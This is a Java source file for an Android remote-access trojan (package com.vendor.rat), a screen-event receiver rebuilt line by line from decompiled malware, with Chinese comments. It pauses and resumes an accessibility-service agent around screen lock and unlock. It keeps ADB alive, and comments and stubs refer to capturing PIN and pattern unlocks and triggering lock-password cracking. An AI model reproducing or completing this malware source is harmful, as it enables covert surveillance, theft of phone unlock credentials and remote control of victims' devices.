package com.vendor.rat.data.collector;

// ADAPT: vendor = com.guard.wallet.receiver.ScreenBroadcastReceiver (167 行)
// 一比一复刻: 5 种屏幕事件 + 无障碍暂停/恢复 + 策略事件 + lockBatchId

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.util.Log;

import com.vendor.rat.MainApplication;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.SharedUtils;

import java.util.Objects;
import java.util.concurrent.atomic.AtomicInteger;

public class ScreenBroadcastReceiver extends BroadcastReceiver {

    private static final String TAG = "ScreenBroadcastReceiver";

    // ADAPT: vendor field f199a = AtomicInteger(1)
    public final AtomicInteger receiverAlive = new AtomicInteger(1);

    // vendor: static method a(int) — 锁屏状态变化处理
    public static void onLockStateChanged(int state) {
        try {
            // vendor: 检查 lockSubscribeId，发送 ReqListenHelper
            String lockSubscribeId = SharedUtils.getString("lockSubscribeId");
            if (lockSubscribeId != null && !lockSubscribeId.isEmpty()) {
                // TODO: VENDOR_VERIFY — l.h(new ReqListenHelper(lockSubscribeId, state))
                SharedUtils.remove("lockSubscribeId");
            }

            // vendor: if (r.k()) r.g(state==4) — PinCapture 控制
            // vendor: o.f(null, state==4) — PatternCapture 控制
            boolean unlocked = (state == 4);
            Log.d(TAG, "Lock state changed: " + state + " unlocked=" + unlocked);
        } catch (Exception e) {
            Log.e(TAG, "onLockStateChanged error", e);
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            this.receiverAlive.set(1);
            if (intent == null) return;
            String action = intent.getAction();
            if (action == null || action.isEmpty()) return;

            int screenState;

            switch (action) {
                case "android.intent.action.SCREEN_OFF":
                    Log.d(TAG, "手机息屏了");
                    onScreenOff(context);
                    screenState = 0;
                    break;

                case "android.intent.action.SCREEN_ON":
                    Log.d(TAG, "手机亮屏了");
                    onScreenOn(context);
                    screenState = 1;
                    break;

                case "android.intent.action.DREAMING_STARTED":
                    Log.d(TAG, "手机开启屏保、进入休眠");
                    screenState = 2;
                    break;

                case "android.intent.action.DREAMING_STOPPED":
                    Log.d(TAG, "手机停止屏保、退出休眠");
                    screenState = 3;
                    break;

                case "android.intent.action.USER_PRESENT":
                    Log.d(TAG, "手机解锁了");
                    onUserPresent(context);
                    screenState = 4;
                    break;

                default:
                    screenState = -1;
                    break;
            }

            // vendor: if (screenState != 0) LockActivity.a()
            if (!Objects.equals(0, Integer.valueOf(screenState))) {
                // TODO: VENDOR_VERIFY — LockActivity.a() 触发
            }

            // vendor: h.D(screenState, "screenState") — 持久化
            SharedUtils.save(Integer.valueOf(screenState), "screenState");

            // vendor: h.H(screenState, action) — 上报屏幕事件
            // TODO: VENDOR_VERIFY — 需要 MODULE_01 消息队列
            Log.d(TAG, "Screen state: " + screenState + ", action: " + action);
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive", e);
        }
    }

    // vendor: SCREEN_OFF 处理 (行 101-121)
    private void onScreenOff(Context context) {
        onLockStateChanged(0);

        // vendor: 暂停无障碍代理
        MyAccessibilityService service = MyAccessibilityService.P();
        if (service != null) {
            // vendor: MyAccessibilityService.q.set(true)
            MyAccessibilityService.q.set(true);
            Log.d(TAG, "stopLocalAccessibilityDelegate");
            // vendor: MyAccessibilityService.P().H(true, false) — 清缓存不刷新
            service.H(true, false);
        }

        // vendor: offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_OFF")
        if (MainApplication.getInstance() != null) {
            Log.d(TAG, "offerStrategyEvent: KEEP_ADB_ALIVE_SCREEN_OFF");
            // TODO: VENDOR_VERIFY — MainApplication.getInstance().offerStrategyEvent(...)
        }

        // vendor: CrackLockCipherPlug.f() — 触发密码破解
        // TODO: VENDOR_VERIFY — 密码破解触发

        // vendor: 清除 lockBatchId
        SharedUtils.remove("lockBatchId");
    }

    // vendor: SCREEN_ON 处理 (行 122-129)
    private void onScreenOn(Context context) {
        // vendor: offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_ON")
        if (MainApplication.getInstance() != null) {
            Log.d(TAG, "offerStrategyEvent: KEEP_ADB_ALIVE_SCREEN_ON");
        }

        // vendor: if (g.p0()) h.D(lockBatchId, "lockBatchId")
        // 如果屏幕锁定，生成 lockBatchId
        // TODO: VENDOR_VERIFY — 屏幕锁定检查 g.p0()
    }

    // vendor: USER_PRESENT 处理 (行 138-157)
    private void onUserPresent(Context context) {
        // vendor: MainApplication.unlockedInstance() 如果未初始化
        if (MainApplication.getInstance() != null) {
            if (!MainApplication.getInstance().isInitialized()) {
                // TODO: VENDOR_VERIFY — MainApplication.unlockedInstance()
                Log.d(TAG, "unlockedInstance triggered on USER_PRESENT");
            }

            // vendor: CrackLockCipherPlug.g() — 密码破解成功回调
            // TODO: VENDOR_VERIFY

            // vendor: offerStrategyEvent("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT")
            Log.d(TAG, "offerStrategyEvent: KEEP_ADB_ALIVE_SCREEN_USER_PRESENT");
        }

        onLockStateChanged(4);

        // vendor: 恢复无障碍代理
        if (MyAccessibilityService.q.get()) {
            MyAccessibilityService.q.set(false);
            // vendor: g.F0(2) — performGlobalAction(HOME) 两次
            MyAccessibilityService service = MyAccessibilityService.P();
            if (service != null) {
                service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
            }
        }
    }

    // 注册方法 (供 DataCollectionManager / MainApplication 调用)
    public static void register(Context context) {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_DREAMING_STARTED);
        filter.addAction(Intent.ACTION_DREAMING_STOPPED);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(new ScreenBroadcastReceiver(), filter, Context.RECEIVER_EXPORTED);
        } else {
            context.registerReceiver(new ScreenBroadcastReceiver(), filter);
        }
        Log.d(TAG, "ScreenBroadcastReceiver 启动完成");
    }
}
